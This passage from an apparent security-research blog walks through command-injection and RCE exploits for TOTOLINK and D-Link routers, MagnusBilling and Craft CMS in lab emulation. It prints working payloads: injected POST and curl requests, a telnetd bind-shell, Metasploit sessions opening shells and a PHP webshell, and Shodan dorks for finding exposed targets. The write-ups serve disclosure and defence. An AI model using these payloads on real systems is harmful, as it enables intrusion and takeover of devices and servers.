mknod: /dev/mem: File exists
mknod: /dev/kmem: File exists
mknod: /dev/null: File exists
mknod: /dev/random: File exists
mknod: /dev/urandom: File exists
mknod: /dev/console: File exists
mknod: /dev/ptmx: File exists
mknod: /dev/ttyS0: File exists
mknod: /dev/ttyS1: File exists
mknod: /dev/ppp: File exists
mknod: /dev/mtd0: File exists
mknod: /dev/mtd1: File exists
mknod: /dev/mtd2: File exists
mknod: /dev/mtd3: File exists
mknod: /dev/mtd4: File exists
mknod: /dev/mtd5: File exists
mknod: /dev/mtd6: File exists
mknod: /dev/mtdblock0: File exists
mknod: /dev/mtdblock1: File exists
mknod: /dev/mtdblock2: File exists
mknod: /dev/mtdblock3: File exists
mknod: /dev/mtdblock4: File exists
mknod: /dev/mtdblock5: File exists
mknod: /dev/mtdblock6: File exists
e2fsck 1.47.0 (5-Feb-2023)
[*] infer network start!!!

[IID] 1
[MODE] debug
[+] Network reachable on 192.168.0.1!
[+] Run debug!
Creating TAP device tap1_0...
Set 'tap1_0' persistent and owned by uid 0
Bringing up TAP device...
Starting emulation of firmware... None false false -1 -1
/root/FirmAE/./debug.py:7: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  import telnetlib
[*] firmware - X5000R_V9.1.0u.6118_B20201102
[*] IP - 192.168.0.1
[*] connecting to netcat (192.168.0.1:31337)
[-] failed to connect netcat
------------------------------
|       FirmAE Debugger      |
------------------------------
1. connect to socat
2. connect to shell
3. tcpdump
4. run gdbserver
5. file transfer
6. exit 
```
Now there is an issue that we need to fix first because the network connectivity from the host to the emulated firmware, which is basically a virtual machine, is not working. You can see this because `netcat` can not connect on 192.168.0.1 and pinging this IP is also not working. In order to fix this, use option `1. connect to socat` to access your running firmware and run below commands to check the network configuration.
```ShellSession
>1
/ # brctl show
brctl show
bridge name	bridge id		STP enabled	interfaces
br0		8000.525400123458	yes		eth2
/ # ifconfig -a
ifconfig -a
br0       Link encap:Ethernet  HWaddr 52:54:00:12:34:56
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56
          BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth1      Link encap:Ethernet  HWaddr 52:54:00:12:34:57
          BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth2      Link encap:Ethernet  HWaddr 52:54:00:12:34:58
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:33 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:1980 (1.9 KiB)

eth3      Link encap:Ethernet  HWaddr 52:54:00:12:34:59
          BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

ip6tnl0   Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00
          NOARP  MTU:1452  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

sit0      Link encap:IPv6-in-IPv4
          NOARP  MTU:1480  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

tunl0     Link encap:UNSPEC  HWaddr 00-00-00-00-D4-7F-2C-6A-00-00-00-00-00-00-00-00
          NOARP  MTU:1480  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

/ # 
```
In my case, there were two issues, first of all the bridge command showed `eth2` instead `eth0` and `br0` did not have any IP configured.
To fix this, run the following commands below to make the firmware accessible from the host.
```ShellSession
/ # brctl addif br0 eth0
brctl addif br0 eth0
/ # brctl show
brctl show
bridge name	bridge id		STP enabled	interfaces
br0		8000.525400123456	yes		eth2
							eth0
/ # ifconfig eth0 up
ifconfig eth0 up
/ # ifconfig br0 192.168.0.1 netmask 255.255.255.0 broadcast 192.168.0.255
ifconfig br0 192.168.0.1 netmask 255.255.255.0 broadcast 192.168.0.255
/ #
```
You should now be able to `ping` the network address 192.168.0.1 from your host and run a `nmap` command to check the services.
```ShellSession
# ping 192.168.0.1
PING 192.168.0.1 (192.168.0.1) 56(84) bytes of data.
64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=8.92 ms
64 bytes from 192.168.0.1: icmp_seq=2 ttl=64 time=2.38 ms
^C
--- 192.168.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 2.384/5.650/8.916/3.266 ms
# nmap 192.168.0.1
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 17:44 UTC
Nmap scan report for 192.168.0.1
Host is up (0.011s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE
23/tcp   filtered telnet
80/tcp   filtered http
8080/tcp filtered http-proxy
MAC Address: 52:54:00:12:34:56 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
```
`nmap` shows that the web service is up and running on port 80 so it is time to dig into the vulnerability.
Reading the CVE, it talks about command insertion vulnerability in setting/setTracerouteCfg using the `command` parameter.
Most of the functionality sits in the `/cgi-bin/cstecgi.cgi` file that you can find in the `www` directory at the emulated firmware. 
```ShellSession
/www/cgi-bin # ls -l
ls -l
-rwxrwxr-x    1 root     root           455 Nov  2  2020 ExportSettings.sh
-rwxrwxr-x    1 root     root        251300 Nov  2  2020 cstecgi.cgi
lrwxrwxrwx    1 root     root            15 Nov  2  2020 custom.cgi -> /tmp/custom.cgi
/www/cgi-bin #
```
To analyze, you can load this `IDA` or `Ghidra` to perform some reverse engineering.
I will not dwell on this topic for now, but the vulnerable code resides in the decompiled function below shown in `Ghidra` where the parameter `command` is not properly escaped when it is executed using the `doSystem` command which is basically an OS command call to the underlying Linux OS.
```c
undefined4 FUN_0041f6a0(undefined4 param_1)

{
  undefined2 *param3;
  undefined2 *__nptr;
  int param2;
  char acStack_90 [128];
  
  memset(acStack_90,0,0x80);
  param3 = websGetVar(param_1,"command",(undefined2 *)"www.baidu.com");
  __nptr = websGetVar(param_1,"num",(undefined2 *)0x437f70);
  param2 = atoi((char *)__nptr);
  sprintf(acStack_90,"traceroute -m %d %s&>/var/log/traceRouteLog",param2,(char *)param3);
  doSystem(acStack_90);
  setResponse(&DAT_00436104,"reserv",param2,param3);
  return 1;
}
```
Besides reverse engineering using `Ghidra` or `IDA`,  you can use the firmware analysis functionality provided by `FirmAE`. This is dynamic analysis using fuzzing and actually exploits from tools  like `Routersploit` to find vulnerable code.

Let's quickly validate if our vulnerable emulated router is vulnerable by sending a malicious `POST` request with a manipulated `command` parameter using `burpsuite`.
```html
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 77
Origin: http://192.168.0.1
Connection: close

{"command":"127.0.0.1; echo cuckoo >/tmp/cuckoo.txt;","num":"200","topicurl":"setTracerouteCfg"}
```
Below is a valid response.
```html
HTTP/1.1 200 OK
Connection: close
Date: Sun, 13 Sep 2015 16:37:50 GMT
Server: lighttpd/1.4.20
Content-Length: 234

traceroute to 127.0.0.1 (127.0.0.1), 200 hops max, 38 byte packets
 1  localhost.localdomain (127.0.0.1)  4.842 ms  0.195 ms  0.192 ms
{
	"success":	true,
	"error":	null,
	"lan_ip":	"192.168.0.1",
	"wtime":	"0",
	"reserv":	"reserv"
}
```
However, it is a blind command injection because nothing is returned in the response with regards to a successful command execution.
We have to check this directly on the emulated firmware and as you can see is the file `/tmp/cuckoo.txt` successfully created.
```ShellSession
/tmp # ls -l *.txt
ls -l *.txt
-rw-rw-rw-    1 root     root             7 Sep 13 16:37 cuckoo.txt
/tmp # cat cuckoo.txt
cat cuckoo.txt
cuckoo
/tmp #
```
A Metasploit module for this exploit is in development.
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/totolink_unauth_rce_cve_2023_30013.rb) in my local repository or as [PR 18365](https://github.com/rapid7/metasploit-framework/pull/18365) at the Metasploit Github development.

### Mitigation
You should update your `TOTOLINK X5000R` router and other vulnerable TOTOLINK network devices listed in this article to the latest available firmware.

### References
[FirmAE](https://github.com/pr0v3rbs/FirmAE)
[FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf)
[Firmware Analysis Toolkit (FAT)](https://github.com/attify/firmware-analysis-toolkit) 
[Firmadyne](https://github.com/firmadyne/firmadyne)
[CVE-2023-30013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30013)
[TOTOLINK Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/totolink_unauth_rce_cve_2023_30013.rb)
[Metasploit PR 18365](https://github.com/rapid7/metasploit-framework/pull/18365)
[TOTOLINK X5000R Firmware](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html)

### Credits
[Kazamayc](https://github.com/Kazamayc)
And to all other good fellows who raised this concern ;-)


---

## CVE-2023-33625
*Posted 2023-10-16 · last revised 2023-10-20*

> D-Link DIR-600 Hardware Version B5, Firmware Version 2.18 was discovered to contain a command injection vulnerability via the ST parameter in the lxmldbc_system() function.

This vulnerability is based on an old theme that was discovered in 2013 by `Zach Cutlip` and explained in his blog [The Shadow File](https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html). It is based on the infamous `UPnP` attack where a command injection vulnerability exists in multiple D-Link network products, allowing an attacker to inject arbitrary command to the `UPnP` via a crafted M-SEARCH packet. 
Universal Plug and Play (UPnP), by default is enabled in most D-Link devices, on the port 1900  and an attacker can perform a remote command execution by injecting the payload into the `Search Target` (ST) field of the SSDP M-SEARCH discover packet.

What triggered my interest is the fact that 10 years after the discovery, this vulnerability still exists and is alive and kicking. Running a Shodan search `title:"d-link"` shows around 80.000 D-Link devices from which a considerable amount of devices are still vulnerable. Fortunately, this attack can only performed as a LAN based attack because the `UPnP` discovery service running on port 1900 is typically not exposed to Public Internet.

Besides the DIR-600 model, multiple other D-Link devices have the same vulnerability. I did some extensive testing with `FirmAE` to simulate and test different D-Link devices and found a comprehensive list of devices that are vulnerable:
* D-Link Router model DIR-300 revisions Ax with firmware v1.06 or older;
* D-Link Router model DIR-300 revisions Bx with firmware v2.15 or older;
* D-Link Router model DIR-600 revisions Bx with firmware v2.18 or older;
* D-Link Router model DIR-645 revisions Ax with firmware v1.05 or older;
* D-Link Router model DIR-815 revisions Bx with firmware v1.04 or older;
* D-Link Router model DIR-816L revisions Bx with firmware v2.06 or older;
* D-Link Router model DIR-817LW revisions Ax with firmware v1.04b01_hotfix or older;
* D-Link Router model DIR-818LW revisions Bx with firmware v2.05b03_Beta08 or older;
* D-Link Router model DIR-822 revisions Bx with firmware v2.03b01 or older;
* D-Link Router model DIR-822 revisions Cx with firmware v3.12b04 or older;
* D-Link Router model DIR-823 revisions Ax with firmware v1.00b06_Beta or older;
* D-Link Router model DIR-860L revisions Ax with firmware v1.12b05 or older;
* D-Link Router model DIR-859 revisions Ax with firmware v1.06b01Beta01 or older;
* D-Link Router model DIR-860L revisions Ax with firmware v1.10b04 or older;
* D-Link Router model DIR-860L revisions Bx with firmware v2.03b03 or older;
* D-Link Router model DIR-865L revisions Ax with firmware v1.07b01 or older;
* D-Link Router model DIR-868L revisions Ax with firmware v1.12b04 or older;
* D-Link Router model DIR-868L revisions Bx with firmware v2.05b02 or older;
* D-Link Router model DIR-869 revisions Ax with firmware v1.03b02Beta02 or older;
* D-Link Router model DIR-880L revisions Ax with firmware v1.08b04 or older;
* D-Link Router model DIR-890L/R revisions Ax with firmware v1.11b01_Beta01 or older;
* D-Link Router model DIR-885L/R revisions Ax with firmware v1.12b05 or older;
* D-Link Router model DIR-895L/R revisions Ax with firmware v1.12b10 or older;
* probably more looking at the scale of impacted devices :-(

In `Metasploit`, several modules are available to exploit this vulnerability, but unfortunately they all lack good `check` logic to determine if a D-Link device is vulnerable. Another limitation is that these modules only cover a part of the vulnerable devices during the exploit phase due to the fact that not all architectures are supported (`mipsbe`, `mipsle` and `armle`).

To overcome these limitations, I created a new module that has an enhanced `check` method that determines the D-Link device model, firmware information and architecture to determine if the device is vulnerable. Also I extended the exploit part to cover the missing `armle` architecture using the `Linux Dropper` target and I included a `Unix Command` target that leverages the `busybox telnetd` payload.

### Module in Action
**D-Link DIR-600 emulated target**
```ShellSession
# ./run.sh -d d-link /root/FirmAE/firmwares/DIR600B6_FW215WWb02.bin
[*] /root/FirmAE/firmwares/DIR600B6_FW215WWb02.bin emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
mke2fs 1.47.0 (5-Feb-2023)
e2fsck 1.47.0 (5-Feb-2023)
[*] infer network start!!!

[IID] 25
[MODE] debug
[+] Network reachable on 192.168.0.1!
[+] Web service on 192.168.0.1
[+] Run debug!
Creating TAP device tap25_0...
Set 'tap25_0' persistent and owned by uid 0
Initializing VLAN...
Bringing up TAP device...
Starting emulation of firmware... 192.168.0.1 true true 60.479548271 107.007791943
/root/FirmAE/./debug.py:7: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  import telnetlib
[*] firmware - DIR600B6_FW215WWb02
[*] IP - 192.168.0.1
[*] connecting to netcat (192.168.0.1:31337)
[+] netcat connected
------------------------------
|       FirmAE Debugger      |
------------------------------
1. connect to socat
2. connect to shell
3. tcpdump
4. run gdbserver
5. file transfer
6. exit
> 2
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.

/ # uname -a
Linux dlinkrouter 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux
/ # hostname
dlinkrouter
/ #
```
**Metasploit module**
```ShellSession
msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > options

Module options (exploit/linux/upnp/dlink_msearch_unauth_lan_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.0.1      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   UPNP_PORT  1900             yes       Universal Plug and Play (UPnP) UDP port
   URIPATH                     no        The URI to use for this exploit (default is random)
   URN        urn:device:1     no        Set URN payload
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/bind_busybox_telnetd):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   LOGIN_CMD  /bin/sh          yes       Command telnetd will execute on connect
   LPORT      4444             yes       The listen port
   RHOST      192.168.0.1      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Unix Command


View the full module info with the info, or info -d command.

msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > check

[*] Checking if 192.168.0.1:80 can be exploited.
[*] 192.168.0.1:80 - The target appears to be vulnerable. Product info: DIR-600|2.15|Bx|mipsle
msf6 exploit(linux/upnp/dlink_msearch_unauth_lan_rce) > exploit

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.0.1:80 can be exploited.
[+] The target appears to be vulnerable. Product info: DIR-600|2.15|Bx|mipsle
[*] Executing Unix Command for cmd/unix/bind_busybox_telnetd
[*] payload: urn:device:1;`telnetd -l /bin/sh -p 4444`
[*] Started bind TCP handler against 192.168.0.1:4444
[*] Command shell session 1 opened (192.168.0.2:41797 -> 192.168.0.1:4444) at 2023-10-16 13:54:53 +0000


Shell Banner:
_!_
-----

# uname -a
uname -a
Linux dlinkrouter 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux
# hostname
hostname
dlinkrouter
#
```
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/dlink_msearch_unauth_lan_rce.rb) in my local repository or as [PR 18463](https://github.com/rapid7/metasploit-framework/pull/18463) at the Metasploit Github development.

### Mitigation
You should update your D-link network devices listed in this article to the latest available firmware.

### References
[CVE-2023-33625](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33625)
[CVE-2020-15893](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15893)
[CVE-2019–20215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20215)
[D-Link DIR-859: UnAuthenticated RCE in ssdpcgi HTTP_ST](https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73)
[The Shadow File: DLink DIR-815 UPnP Command Injection](https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html)
[Multiple Vulnerabilities discovered in the D-link Firmware DIR-816L](https://research.loginsoft.com/vulnerability/multiple-vulnerabilities-discovered-in-the-d-link-firmware-dir-816l/)
[D-link DIR-600 cmd injection vulnerability](https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md)
[D-Link UPnP Unauthenticated LAN RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/dlink_msearch_unauth_lan_rce.rb)
[D-Link UPnP Unauthenticated LAN RCE - Metasploit PR 18463](https://github.com/rapid7/metasploit-framework/pull/18463)
[D-Link Firmware Repository](http://legacyfiles.us.dlink.com/)
[FirmAE](https://github.com/pr0v3rbs/FirmAE)
[FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf)

### Credits
* `Zach Cutlip`
* `Michael Messner <devnull@s3cur1ty.de>`
* `Miguel Mendez Z. (s1kr10s)`
* `Pablo Pollanco (secenv)`
* `Naihsin https://github.com/naihsin`

And to all other good fellows who raised this concern ;-)

---

## CVE-2023-30258
*Posted 2023-10-24 · last revised 2023-10-31*

> Command Injection vulnerability in MagnusSolution magnusbilling 6.x and 7.x allows remote attackers to run arbitrary commands via unauthenticated HTTP request.

`MagnusBilling` is an open source tool written in `PHP` and `JAVASCRIPT`, using the `EXTJS 6` and `YII FRAMEWORK` frameworks, aimed at IP telephony providers. It provides a complete and powerful system for anyone to start an IP telephony provider.

Unfortunately a command injection vulnerability exists in `MagnusBilling` versions 6 and 7. The vulnerability allows an unauthenticated user to execute arbitrary OS commands on the host, with the privileges of the web server. This is caused by a piece of demonstration code which is present in `lib/icepay/icepay.php`, with a call to `exec()` at line 753. The parameter to `exec()` includes the `GET` parameter `democ`, which is controlled by the user.

```php
if (isset($_GET['demo'])) {

    if ($_GET['demo'] == 1) {
        exec("touch idepay_proccess.php");
    } else {
        exec("rm -rf idepay_proccess.php");
    }
}
if (isset($_GET['democ'])) {
    if (strlen($_GET['democ']) > 5) {
/** begin vulnerable code **/
        exec("touch " . $_GET['democ'] . '.txt');
/** end vulnerable code **/
    } else {
        exec("rm -rf *.txt");
    }
}
```
An unauthenticated user is able to execute arbitrary OS commands. The commands run with the privileges of the web server process, typically `www-data` or `asterisk`. At a minimum, this allows an attacker to compromise the billing system and its database.

You can simply test the vulnerability launching a `curl` request issuing a blind command injection using a `sleep` command, lets say 15 seconds.
`Curl` will take approximately 15 seconds to return if the target is vulnerable.

```shell
curl 'http://192.168.201.31/mbilling/lib/icepay/icepay.php?democ=iamhacked;sleep%2015;#'
```
A `shodan` search with dork `http.html:"magnusbilling"` still shows a significant amount of instances (2200+) that are accessible from the Public Internet from which at least 30%-40% is still vulnerable at the time of writing.

I have created a Metasploit module that checks the vulnerability of a target and makes use of the vulnerability to exploit the target. It allows you to choose from different target options such as deploying and launching an obfuscated `PHP` webshell, performing a `UNIX` command injection or launching native `Linux Meterpreter`.

## Module in action
```shell
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > info

       Name: Magnusbilling application unauthenticated Remote Command Execution.
     Module: exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
   Platform: PHP, Unix, Linux
       Arch: php, cmd, x64, x86
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2023-06-26

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Eldstal

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   PHP
      1   Unix Command
      2   Linux Dropper

Check supported:
  Yes

Basic options:
  Name       Current Setting         Required  Description
  ----       ---------------         --------  -----------
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics
                                               /using-metasploit.html
  RPORT      80                      yes       The target port (TCP)
  SSL        false                   no        Negotiate SSL/TLS for outgoing connections
  SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /mbilling               yes       The MagnusBilling endpoint URL
  URIPATH                            no        The URI to use for this exploit (default is random)
  VHOST                              no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local ma
                                      chine or 0.0.0.0 to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.


  When TARGET is 0:

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  WEBSHELL                   no        The name of the webshell with extension. Webshell name will be randomly generated if left
                                       unset.

Payload information:

Description:
  A Command Injection vulnerability in magnusbilling application 6.x and 7.x allows
  remote attackers to run arbitrary commands via unauthenticated HTTP request.
  A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec().
  The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and
  not properly sanitised/escaped.
  After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands.
  The commands run with the privileges of the web server process, typically `www-data` or `asterisk`.
  At a minimum, this allows an attacker to compromise the billing system and its database.

  The following magnusbilling applications are vulnerable:
  - Magnusbilling application version 6 (all versions);
  - Magnusbilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;

References:
  https://nvd.nist.gov/vuln/detail/CVE-2023-30258
  https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258
  https://eldstal.se/advisories/230327-magnusbilling.html


View the full module info with the info -d command.
```
### Example using the PHP target option
```shell
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set rhosts 192.168.201.31
rhosts => 192.168.201.31
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.31:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 5 seconds.
[*] Elapsed time: 5.1 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (39927 bytes) to 192.168.201.31
[+] Deleted LfsCVIttNL.php
[*] Meterpreter session 3 opened (192.168.201.8:4444 -> 192.168.201.31:46230) at 2023-10-24 10:26:47 +0000

meterpreter > getuid
Server username: asterisk
meterpreter > sysinfo
Computer    : debian
OS          : Linux debian 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
Meterpreter : php/linux
meterpreter >
```
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/magnusbilling_unauth_rce_cve_2023_30258.rb) in my local repository or as [PR 18481](https://github.com/rapid7/metasploit-framework/pull/18481) at the Metasploit Github development.

### Mitigation
You should update your `MagnusBilling` application  to the latest version or remove the vulnerable code from the file `lib/icepay/icepay.php` under the `mbilling` directory at your web server root.

### References
[CVE-2023-30258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30258)
[Security Advisory](https://eldstal.se/advisories/230327-magnusbilling.html)
[MagnusBilling Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/magnusbilling_unauth_rce_cve_2023_30258.rb)
[MagnusBilling Unauthenticated RCE - Metasploit PR 18481](https://github.com/rapid7/metasploit-framework/pull/18481)
[MagnusBilling 7](https://github.com/magnussolution/magnusbilling7)
[MagnusBilling 6](https://github.com/magnussolution/magnusbilling6)


### Credits
* `eldstal.se`  discovery of the vulnerability


---

## CVE-2023-41892
*Posted 2023-12-16 · last revised 2023-12-19*

> Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector. Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.

`CraftCMS` is a popular content management system that is widely used and available on the Internet. Unfortunately  `CraftCMS` versions between `4.0.0-RC1` - `4.4.14` are exposed by a vulnerability allowing attackers to execute arbitrary code remotely, potentially compromising the security and integrity of the application.

The vulnerability occurs using a PHP object creation in the `\craft\controllers\ConditionsController` class which allows to run arbitrary PHP code by escalating the object creation calling some methods available in `\GuzzleHttp\Psr7\FnStream`. Using this vulnerability in combination with `The Imagick Extension` and `MSL` which stands for `Magick Scripting Language`, a full RCE can be achieved. `MSL` is a built-in `ImageMagick` language that facilitates the reading of images, performance of image processing tasks, and writing of results back to the filesystem. This can be leveraged to create a dummy image containing malicious PHP code using the `Imagick` constructor class delivering a webshell that can be accessed by the attacker, thereby executing the malicious PHP code and gaining access to the system.

Well, this is quite a mouth full, so let's take it step by step...

Let's first touch the part of `PHP Object Creation` which is the core of the issue. In this [article from ptswarm](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) written by `Arseniy Sharoglazov` the concept of  `PHP’s Arbitrary Object Instantiation` is very well explained that is a flaw in which an attacker can create arbitrary objects. This flaw can come in all shapes and sizes.

Within CraftCMS versions `4.4.14` and below, this flaw can also be leveraged to run arbitrary code on a vulnerable instance.
In this [blog](https://blog.calif.io/p/craftcms-rce) published by `Thanh` on September 14,  the security researchers discovered a PHP object instantiation flaw that resides in the `\craft\controllers\ConditionsController` class. The `beforeAction` method was identified and provided the ability to create an arbitrary object.
So far, so good, but you will need to find gadgets that can be used to escalate the object creation into something meaningful, like methods that allow to run code. One of these methods was found in the `\GuzzleHttp\Psr7\FnStream` class.
```
public function __destruct()
{
   if (isset($this->_fn_close)) {
       call_user_func($this->_fn_close);
   }
}
```
with the `curl` command below, you can trigger this flaw calling the method and executing the `phpinfo` command.
```
curl -sk "https://craftcms-vuln.ddev.site" -x localhost:8080 -X POST -d 'action=conditions/render&configObject[class]=craft\elements\conditions\ElementCondition&config={"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
```
Capturing the response with `burpsuite` shows that the `phpinfo` is executed.

**Burp response**
```html
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=UTF-8
Date: Sun, 17 Dec 2023 17:17:41 GMT
Server: nginx
X-Powered-By: Craft CMS
X-Robots-Tag: none

    <!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8"/>

    <title>Invalid Configuration – yii\base\InvalidConfigException</title>

--- SNIP REMOVED CONTENT ---

<h1 class="p">PHP Version 8.1.26</h1>
</td></tr>
</table>
<table>
<tr><td class="e">
     System
    </td>
    <td class="v">
       Linux craftcms-vuln-web 6.4.16-linuxkit #1 SMP PREEMPT_DYNAMIC Thu Nov 16 10:55:59 UTC 2023 x86_64 
     </td>
</tr>
<tr><td class="e">
